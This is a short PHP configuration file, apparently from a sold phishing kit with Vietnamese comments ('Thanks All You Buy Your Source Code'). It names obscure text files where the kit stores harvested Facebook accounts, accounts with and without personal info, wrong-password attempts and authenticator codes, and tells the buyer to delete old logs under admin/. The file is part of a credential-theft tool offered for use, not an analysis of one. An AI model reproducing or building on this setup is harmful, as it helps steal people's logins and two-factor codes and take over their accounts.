<?php
/***
 * Code chất chỉ có tại TAN Dz
 * Thanks All You Buy Your Source Code
***/

//dưới đây là phần đổi tên file lưu account
//delete file cũ tại đường dẫn : admin/...

$name_facebook = "truonganh35.txt"; // acc facebook
$name_no_info = "ggasdsadsad.txt"; // acc không thông tin
$name_no_error_pass = "zxcxzxczxczxc.txt"; // acc không thông tin lỗi pass
$name_yes_info = "zxczxczcxzxxzzzzz.txt"; // acc có thông tin
$name_authen = "12321321waasa.txt"; // acc authenticator



?>